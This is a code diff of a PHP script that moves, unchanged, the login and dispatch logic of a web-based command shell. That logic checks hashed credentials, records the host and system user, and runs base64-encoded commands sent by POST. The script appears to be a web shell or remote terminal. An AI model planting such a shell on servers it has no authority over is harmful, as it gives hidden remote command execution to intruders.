@@ -236,6 +236,36 @@ if (!isset($_POST['exec'])) {
             </style>";
 }
 
+if (!isset($_SESSION['logged_in']) && isset($_POST['exec'])) {
+    echo '{"error": "NoLogin"}';
+} else if (!isset($_SESSION['logged_in'])) {
+    if (!isset($_POST['username'])) {
+        displayLogin();
+    } else {
+        if (hash('sha512', $_POST['username']) == $USERNAME && hash('sha512', $_POST['password']) == $PASSWORD) {
+            $_SESSION['logged_in'] = true;
+            $_SESSION['cwd'] = getDir(getcwd());
+            $_SESSION['cwdlong'] = getcwd();
+            $_SESSION['hostname'] = gethostname();
+            $_SESSION['user'] = posix_getpwuid(posix_geteuid())['name'];
+            displayShell();
+        } else {
+            displayLogin(true);
+        }
+    }
+} else if ($_SESSION['logged_in'] && isset($_POST['logout'])) {
+    unset($_SESSION['logged_in']);
+    displayLogin();
+} else if ($_SESSION['logged_in'] && !isset($_POST['exec'])) {
+    $_SESSION['cwd'] = getDir(getcwd());
+    $_SESSION['cwdlong'] = getcwd();
+    $_SESSION['hostname'] = gethostname();
+    $_SESSION['user'] = posix_getpwuid(posix_geteuid())['name'];
+    displayShell();
+} else if ($_SESSION['logged_in'] && isset($_POST['exec'])) {
+    executeCMD(base64_decode($_POST['exec']));
+}
+
 if (isset($_SESSION['logged_in']) && !isset($_POST['exec'])) {
     echo "  <script>
                 var cmdhistory = [];
@@ -345,36 +375,6 @@ if (isset($_SESSION['logged_in']) && !isset($_POST['exec'])) {
                     bindClick();
                 };
             </script>";
-}
-
-if (!isset($_SESSION['logged_in']) && isset($_POST['exec'])) {
-    echo '{"error": "NoLogin"}';
-} else if (!isset($_SESSION['logged_in'])) {
-    if (!isset($_POST['username'])) {
-        displayLogin();
-    } else {
-        if (hash('sha512', $_POST['username']) == $USERNAME && hash('sha512', $_POST['password']) == $PASSWORD) {
-            $_SESSION['logged_in'] = true;
-            $_SESSION['cwd'] = getDir(getcwd());
-            $_SESSION['cwdlong'] = getcwd();
-            $_SESSION['hostname'] = gethostname();
-            $_SESSION['user'] = posix_getpwuid(posix_geteuid())['name'];
-            displayShell();
-        } else {
-            displayLogin(true);
-        }
-    }
-} else if ($_SESSION['logged_in'] && isset($_POST['logout'])) {
-    unset($_SESSION['logged_in']);
-    displayLogin();
-} else if ($_SESSION['logged_in'] && !isset($_POST['exec'])) {
-    $_SESSION['cwd'] = getDir(getcwd());
-    $_SESSION['cwdlong'] = getcwd();
-    $_SESSION['hostname'] = gethostname();
-    $_SESSION['user'] = posix_getpwuid(posix_geteuid())['name'];
-    displayShell();
-} else if ($_SESSION['logged_in'] && isset($_POST['exec'])) {
-    executeCMD(base64_decode($_POST['exec']));
 }
 
 if (!isset($_POST['exec'])) {
